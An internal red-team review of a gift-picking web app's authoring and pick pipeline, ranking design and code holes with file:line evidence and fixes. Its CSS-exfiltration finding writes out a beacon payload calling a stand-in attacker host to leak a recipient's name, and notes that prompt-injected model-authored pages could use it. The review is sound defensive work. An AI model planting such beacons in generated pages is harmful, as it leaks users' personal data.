# redteam-seam.md — breaking the core bet (read-only attack on clean-slate)

> Target: the plan's central bet — *"model authors freeform HTML; spine extracted from `data-peek-*`;
> the gate validates the spine; server enforces caps on the spine."* Every finding is against the
> actual clean-slate code at HEAD (the stable base). Nothing here is "looks solid" — each is a
> concrete input + file:line where it bites.

---

## THE CORE BET DOES NOT HOLD AS STATED — three of its four clauses are already broken in code

| clause of the bet | reality in code | verdict |
|---|---|---|
| "model authors freeform HTML" | yes (`set_page`/`edit_region` → `turn.ts`) | TRUE |
| "spine extracted from data-peek-* tags" | yes (`extractSpine`, `draft.ts`) | TRUE-but-lossy |
| "**the gate validates the spine**" | the gate (`decide`) is **never called on the authoring path**; spine is only Zod-shape-checked + `extractSpine.issues[]` is **discarded** | **FALSE** |
| "**server enforces caps on the spine**" | `decidePick` is called **without `caps`**; the recipient HTML surface **never calls `/api/pick` at all** | **FALSE** (twice) |

The bet's two load-bearing verbs — *validates* and *enforces* — are both unwired. The plan (Ch1/Ch3) says it will wire them; this report shows the wiring is harder than "pass an arg," because the representations don't actually join.

---

## RANKED HOLES (likelihood × damage)

### H1 — [STRATEGIC] The recipient HTML surface has NO bridge to `/api/pick`: the loop physically cannot close on the primary surface — likelihood HIGH, damage CRITICAL
This is THE milestone ("one real …pick… run, green") and it is dead on arrival on the surface the recipient actually sees.

- `/g/[slug]/page.tsx:30-37` serves the authored page as `<iframe srcDoc=… sandbox="allow-scripts">` — **no `allow-same-origin`**.
- Inside that iframe, `frameDoc()` (`page-html.ts:11-14`) injects only `window.__PEEK__={mode:"recipient"}` + `peek-runtime.js`. It **never sets `cfg.onAction`**.
- `peek-runtime.js:178-183`: `doAction` does `if (typeof cfg.onAction === "function") cfg.onAction(...)` — `onAction` is undefined, and the `else` branch only logs *when `cfg.mode !== "recipient"`*. So when the recipient taps "Send my picks," **nothing happens** — no fetch, no postMessage, no navigation.
- `/api/pick` is only ever called by `recipient-view.tsx:18`, the React **fallback** that renders solely when `presentation.html` is null (`/g/[slug]/page.tsx:27` gates the iframe; `:40-41` is the fallback). With a sandboxed cross-origin iframe and no `postMessage` listener anywhere (`grep onAction|postMessage|addEventListener.*message` → 0 hits beyond the two above), there is no path from a recipient tap to the server.
- The plan calls this an "isolated origin" win (THE CALLS #5). But isolation without a `postMessage` bridge = the pick can never leave the iframe. Picks=0 stays 0.

**Mitigation:** add a `postMessage` channel: the runtime posts `{type:'pick',cardId}` to `parent`; a thin client wrapper on `/g/[slug]` listens, calls `/api/pick`, posts the validated `picks[]` back, and the runtime reconciles `data-peek-picked`. The CTA must round-trip through the server before showing "sent." This is net-new code the plan's Ch3 GATE depends on and the plan does not name it.

---

### H2 — [STRATEGIC] The pick join key drifts: client `data-peek-id` ≠ server `Card.id`, so even a wired bridge mis-picks or 404s — likelihood HIGH, damage HIGH
The bet assumes "joined on stable `data-peek-id === Card.id`." Two independent id-minting paths guarantee divergence:

- **Server** (`extract.ts:126-155`): if `data-peek-id` is absent it derives `id = kebab(data-name ?? text)` or `card-<n>-<hash>`; duplicates get `-2`/`-3` suffixes; this id lands in `Card.id`.
- **Client runtime** (`peek-runtime.js:16-19`): if `data-peek-id` is absent it stamps `card.getAttribute("data-name") || ("c"+ ++uid)` — a *different* algorithm (raw `data-name`, not kebabbed; `c1/c2…` not `card-1-<hash>`).
- So for any untagged card the recipient's `order{}` is keyed by e.g. `"Steak Dinner"` or `"c3"`, while the spine card is `"steak-dinner"`. `decidePick` (`engine.ts:27-28`) does `doc.cards.find(c => c.id === action.cardId)` → **`NOT_FOUND` → 409**, or worse, a *collision* picks the wrong card.
- Duplicate-id de-dup is also split-brained: server renames the 2nd `gift` to `gift-2` (`extract.ts:143-154`); the client runtime has **no de-dup** — `cardById` (`:20`) `querySelector`s the **first** match, so the runtime and the spine disagree about which DOM node is `gift-2`.

**Mitigation:** make `extractSpine` the *only* id authority — stamp the derived ids back into the HTML before persisting `presentation.html` (rewrite the tags), so the served DOM carries the exact `Card.id`. Today `draft.ts:25` extracts ids but throws away the rewritten HTML (it stores `args.html` unchanged at `:41`). Until then the join is a coin-flip on any page the model didn't perfectly tag.

---

### H3 — [STRATEGIC] `edit_region`-only turns silently wipe the page AND the spine (resume amnesia) — likelihood HIGH on multi-turn editing, damage CRITICAL
The studio is a *conversation* — turn 2 is usually "make the hero darker," i.e. an `edit_region`/`set_style` with no `set_page`. The server cannot survive this:

- `api/curator/route.ts:57`: `currentHtml` is initialized to `""` **fresh every request**. The prior `presentation.html` is **never seeded into it** — `loadDocumentById(peekId)` is loaded (`:78`) only to pass as `base` for the *spine merge*, never to seed `currentHtml`.
- A turn that emits only `patch`/`style`/`media`: `applyPageOp("", {type:"patch"})` hits `page-html.ts:26` `if (!html) return html` → returns `""`. So the edit is applied to nothing.
- Then `route.ts:76` `if (… currentHtml.trim())` is **false** → the save block is skipped → the edit **never persists**. The studio's live iframe shows the patched page (client `patchRegion`, `studio/page.tsx:95-104`), but reload/recipient sees the pre-edit page. Optimistic client, amnesiac server.
- Worse path: if a future turn *does* set a tiny page and the base-merge runs, `extractSpine(currentHtml)` runs on the *partial* HTML and **overwrites `spine.cards`** (`draft.ts:25,37`) — every card not in this turn's fragment is **deleted from the spine**. The presentation HTML and the commerce spine fall permanently out of sync.

**Mitigation:** seed `currentHtml` from `base.presentation.html` at the top of the stream so patches compose against the real page; only re-extract+save when `currentHtml` actually changed. This is a few lines but it is the difference between a stateful studio and a one-shot generator. The plan's Ch2 GATE ("a page authored live") will pass on turn 1 and hide this — it bites on turn 2.

---

### H4 — [STRATEGIC] The "gate validates the spine" claim is a hand-wave: `decide()` never runs on authored pages; `extractSpine.issues[]` are discarded — likelihood CERTAIN, damage HIGH
The plan's whole differentiator (BUILD-PLAN §THE BET, Ch1 "Spine-through-the-gate `extractSpine → decide`") does not exist and is an impedance mismatch as designed:

- `api/curator/route.ts` imports `buildDraftDocument` + `savePeekDocument` only; **no `decide`/`apply`/`fold`** (audit-verify Item 4 confirmed; `grep decide apps/web` → only `decidePick` in the pick route). The HTML is gated by `sanitizeHtml` (`turn.ts:71`) and shape-checked by `validatePeekDocument` on *load* (`store.ts:49`) — never by the maker-checker.
- `extractSpine` returns a rich `issues[]` (malformed price, dup id, lone group, `unpriced_in_tab`, `locked_without_unlock` — `extract.ts:135-311`). **`draft.ts:25` destructures only `{cards, variant_groups}` and drops `issues` on the floor.** A malformed authored page does **not** bounce at the boundary — it persists silently with a wrong spine. The bet's "malformed page bounces" is false.
- The impedance mismatch: `decide`'s command union (`set_concept`/`set_theme`/`upsert_section`, `decide.ts`) is built for *structured-IR authoring*. There is **no command** that means "here is a derived `Card[]` from HTML." To route the spine "through `decide`" you'd have to synthesize fake `add_card` commands from the extracted cards — at which point `decide` is validating data it didn't author against invariants `extractSpine` already bypassed. It's a ceremony, not a gate. The real gate that's needed is "**reject the save if `issues` contains an `error` (or a blocking `warn`)**," which is a 3-line check nobody wrote.

**Mitigation:** make `buildDraftDocument` return `issues`; have `api/curator/route.ts` refuse to save (and tell the model via a tool error) when `issues` has `level:"error"` or publish-blocking warns (`unpriced_in_tab`). Drop the pretense of routing HTML-derived data through the IR `decide()`; the honest gate is `extractSpine.issues` + a publish precondition.

---

### H5 — [STRATEGIC] Locked cards can NEVER be picked server-side — the unlock mechanic is client-cosmetic only — likelihood CERTAIN where any lock is used, damage HIGH
The corpus calls the rules engine "the genuinely defensible core." On the freeform path it is decorative:

- `extract.ts:198-223`: a `data-unlock="after:<token>"` card is stored with `is_locked:true` and `unlock_rule:{kind:"event"}`, token shoved into `metadata.unlock_after_token`. Core `UnlockRule` has **no card/group reference field** (`contract.ts:108-112`) — the join token is lost to metadata the engine ignores.
- `engine.ts:30`: `if (card.is_locked) return err(FORBIDDEN…)` — **unconditional**. There is no code anywhere that flips `is_locked → false` after the trigger pick. The runtime adds a cosmetic `.unlocked` class + `data-peek-unlocked="1"` (`peek-runtime.js:78-84`), but that lives only in the iframe DOM and (per H1) never reaches the server.
- Net: the canonical "pick everything unless you spend a day with me" mechanic (corpus §3.4) renders and *looks* unlockable, but the server forbids the pick forever. A recipient who unlocks the Ferrari client-side and taps it gets a 409 (if H1/H2 were ever fixed). The mechanic the product is sold on is unenforceable as built.

**Mitigation:** the pick request must carry the recipient's current `picks[]`, and `decidePick` must re-evaluate `requires_picks`/`event` unlocks server-side from that set (the token→trigger join must move from `metadata` into a first-class field on `UnlockRule`). This is core surgery, not a route tweak.

---

### H6 — [TACTICAL] Server `applyPageOp` (node-html-parser round-trip) ≠ client `outerHTML` patch → spine extracted from a *different* DOM than the recipient sees — likelihood MEDIUM-HIGH, damage MEDIUM-HIGH
Two different HTML engines author two different truths:

- Client studio patch: `studio/page.tsx:100` `el.outerHTML = html` on the **browser's live DOM** (real HTML parser, full normalization, scripts/runtime already mutated it).
- Server: `page-html.ts:29-32` `parse(html)` with **node-html-parser** then `.replaceWith` then `.toString()` — a different, lossier parser (it does not implement the HTML5 tree-construction algorithm; mis-nested tags, implicit `<tbody>`, self-closing quirks serialize differently). `extractSpine` then runs on **this** server string.
- So the spine is derived from the server's re-serialization while the recipient is served... also the server string (`/g/[slug]` re-sanitizes `presentation.html`) — but the *studio preview* (what the creator approved on the phone, the Ch2 screenshot GATE) is the **client** DOM. Creator approves page A; spine + recipient get page B. `keepDoctype` (`page-html.ts:16-20`) is a band-aid that proves the round-trip already drops the doctype — a tell that other structural loss is unhandled.
- `set_style` compounds it: server appends `<style>` to `<head>` via `insertAdjacentHTML` (`page-html.ts:37`); if the model's page has no `<head>` the style goes to `root` — different cascade than the client's `d.head.appendChild` (`studio/page.tsx:111`).

**Mitigation:** pick ONE parser for the persisted artifact. Either (a) the server is the single source of truth and the studio reloads the server-rendered HTML after each turn (kills the optimistic feel), or (b) the client posts its final serialized DOM back to the server and the server extracts from *that* exact string (no re-parse). Mixing them guarantees skin≠spine.

---

### H7 — [TACTICAL] Pick persistence is a JSONB read-modify-write with no concurrency control (the B13/M24/C08 pattern) — likelihood MEDIUM, damage MEDIUM-HIGH
The corpus flags this as a *recurring* pattern, not a one-off. It is reproduced verbatim on the freeform line:

- `picks.ts:15-31`: `loadPicks` (SELECT) → `decidePick` in the route → `savePicks` (`upsert … onConflict:"peek_id"`). No row lock, no version column, no `WHERE updated_at = ?`. Two concurrent taps (recipient double-taps, or recipient + a collaborator) both read the same `current`, both compute, the second `upsert` **clobbers** the first → a lost pick. `peek_picks` is one row/peek with a `jsonb` array (corpus §3.1 drift note), so the whole array is the contended cell.
- Same shape on the document: `savePeekDocument` (`store.ts:29-40`) upserts the entire `doc` JSONB with `onConflict:"id"`, no version guard. Two curator turns in flight (or a publish racing a turn) → last-writer-wins clobbers the other's HTML+spine. `markPeekPublished` (`store.ts:67-90`) is load-modify-save too: a turn that saves a `draft` doc *after* `markPeekPublished` read it will resurrect `status:"draft"` over `published` (re-opens the paywall — the B16 shape).

**Mitigation:** add an integer `version` column; `UPDATE … WHERE id=? AND version=?` (optimistic lock) and 409 on mismatch, OR move picks to an append-only `picks` row-per-pick table (which the schema already has, and which preserves the beg/fulfillment columns the jsonb array dropped). Stripe webhook publish especially must not be a read-modify-write (fail-CLOSED requirement, Ch4).

---

### H8 — [TACTICAL] Runtime drift between the studio iframe and the recipient iframe (sandbox + onAction context) — likelihood CERTAIN, damage MEDIUM
The corpus names `runtime_version` as the field that exists to track exactly this; it is hardcoded `"1"` (`page-html.ts:5`) and never checked, so drift is invisible.

- Studio iframe: `sandbox="allow-scripts allow-same-origin"` (`studio/page.tsx:262`) — runtime can read/mutate parent-ish, `cfg.rescan` works, patches land.
- Recipient iframe: `sandbox="allow-scripts"` (`/g/[slug]:34`) — no same-origin. Same `peek-runtime.js`, **different capabilities**. Any future bridge that assumes same-origin (the easy fix for H1) will work in the studio and silently fail for the recipient. The two surfaces are not running the same effective runtime despite sharing the file.
- The injected sheet/bar (`peek-runtime.js:114-170`) assumes its CTA semantics: studio bar says "Publish · $12", recipient bar says "Send my picks" keyed on `cfg.mode`. The publish CTA in preview has no handler either (`doAction` logs to console, `:182`) — so the Ch2→Ch4 publish path also lacks a bridge, same root cause as H1.

**Mitigation:** version the runtime contract for real (bump `runtime_version`, assert it on load), and design ONE bridge that works under `sandbox="allow-scripts"` (postMessage only — never assume same-origin). De-risk by making the recipient sandbox the canonical target and testing the studio against the *stricter* sandbox.

---

### H9 — [TACTICAL] CSS exfiltration survives sanitization on the isolated origin — likelihood MEDIUM, damage MEDIUM (data-leak, not script-exec)
The plan leans on "isolated origin neutralizes XSS." It neutralizes script execution, not CSS-based exfil:

- `sanitize.ts:42-48` `sanitizeCssText` strips `@import`, `expression()`, `behavior`, and `url(javascript:)` — but does **not** strip `url(https://attacker.example/leak?…)`. A model-authored (or prompt-injected) page can do `background-image:url(https://evil/collect?n=NAME)` or attribute-selector exfil of any value rendered into the DOM (recipient name lives in the type per the design law). audit-verify Item 5 flagged this caveat explicitly.
- The isolated origin contains script damage but the recipient's name/relationship/occasion are *in the HTML by design* — CSS can beacon them out. No CSP `style-src`/`img-src`/`connect-src` allowlist is set anywhere (no CSP header found on `/g/[slug]`).

**Mitigation:** add a CSP on the sandbox response with `img-src`/`style-src`/`connect-src`/`font-src` allowlists; have `sanitizeCssText` rewrite remote `url()` hosts against an allowlist (fonts.gstatic, the asset bucket, fal). This is in Ch5 scope but the plan frames isolation as sufficient — it is not for data exfil.

---

## THE SINGLE WORST

**H1 — the recipient HTML surface cannot send a pick.** The plan's entire reason to exist is closing the loop once (`picks=0 → 1`), and on the *primary* recipient surface (`presentation.html` in a `sandbox="allow-scripts"` iframe) there is **no code path from a recipient tap to `/api/pick`**: `cfg.onAction` is never defined inside the iframe, there is no `postMessage` bridge, and the only `/api/pick` caller is the React fallback that renders only when `presentation.html` is null. `peek-runtime.js:181` calls an undefined `onAction`; `frameDoc()` (`page-html.ts:11-14`) never sets it. Compounded by H2 (the client mints different ids than the spine) and H5 (locks forbid forever), even a hand-rolled bridge mis-picks. Ch3's GATE ("recipient picks within a hard cap, over-cap blocked, pick persists, creator notified") cannot pass without net-new bridge + id-reconciliation + server-side cap derivation + unlock re-evaluation — four pieces, none of which the build plan names. The bet's "server enforces … on the spine" is unreachable until a recipient pick can physically reach the spine.

---

## evidence index (file:line)
- recipient iframe, no same-origin, no bridge: `apps/web/app/g/[slug]/page.tsx:27-41`
- `onAction` never set; runtime calls it: `apps/web/lib/curator/page-html.ts:11-14`, `apps/web/public/peek-runtime.js:178-183`
- only `/api/pick` caller is the fallback: `apps/web/components/recipient-view.tsx:18`
- client id minting ≠ server id minting: `apps/web/public/peek-runtime.js:16-19` vs `apps/web/lib/curator/extract.ts:126-155`
- `currentHtml` reset to "" per request; prior HTML never seeded: `apps/web/app/api/curator/route.ts:57,76-89`
- patch on empty html is a no-op: `apps/web/lib/curator/page-html.ts:22-32`
- `issues[]` discarded; no `decide` on author path: `apps/web/lib/curator/draft.ts:25`; `apps/web/app/api/curator/route.ts` imports
- caps never passed: `apps/web/app/api/pick/route.ts:22`; engine gates caps behind optional arg: `packages/core/src/picks/engine.ts:21-73`
- locked = forbidden unconditionally: `packages/core/src/picks/engine.ts:30`; client-only unlock: `apps/web/public/peek-runtime.js:78-84`
- server parser round-trip vs client outerHTML: `apps/web/lib/curator/page-html.ts:29-37` vs `apps/web/app/studio/page.tsx:100,111`
- JSONB read-modify-write, no version: `apps/web/lib/persistence/picks.ts:15-31`, `apps/web/lib/persistence/store.ts:29-40,67-90`
- sandbox drift: `apps/web/app/studio/page.tsx:262` vs `apps/web/app/g/[slug]/page.tsx:34`
- CSS remote url() not stripped: `apps/web/lib/sanitize.ts:42-48`
